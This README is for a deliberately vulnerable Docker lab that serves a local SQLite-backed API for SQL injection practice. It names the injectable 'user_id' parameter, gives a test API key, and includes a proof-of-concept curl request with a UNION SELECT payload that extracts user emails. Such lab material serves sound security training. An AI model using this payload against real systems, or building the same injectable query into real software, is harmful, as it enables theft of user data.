# SQLite_SQLinjection_Docker
SQLite SQLInjection testing with Docker

### Installation

```
git clone https://github.com/Xib3rR4dAr/SQLite_SQLinjection_Docker.git
cd SQLite_SQLinjection_Docker
docker-compose up
```

### Usage

API endpoint documentation can be accessed by visiting `http://127.0.0.1:8000/docs`.  
API can be accessed interactively also from thesame endpoint.

### Vulnerable System
Vulnerable Endpoint: `http://127.0.0.1:8000/api/v1/users/me/info?user_id=1`  
Vulnerable Parameter: `user_id`  
Mandatory Header name: `x-api-key`  
Mandatory Header Value: `my-secret-api-key`  

### PoC

```
curl -X 'GET' \
  'http://127.0.0.1:8000/api/v1/users/me/info?user_id=-1%27%20UNION%20SELECT%20123%2Cemail%2C3%2Csqlite_version%28%29%20FROM%20users--%20-' \
  -H 'accept: application/json' \
  -H 'x-api-key: my-secret-api-key'
```

### Screenshot

![image](https://github.com/user-attachments/assets/d472fe8c-ad91-4971-ab0d-ace98b18f047)
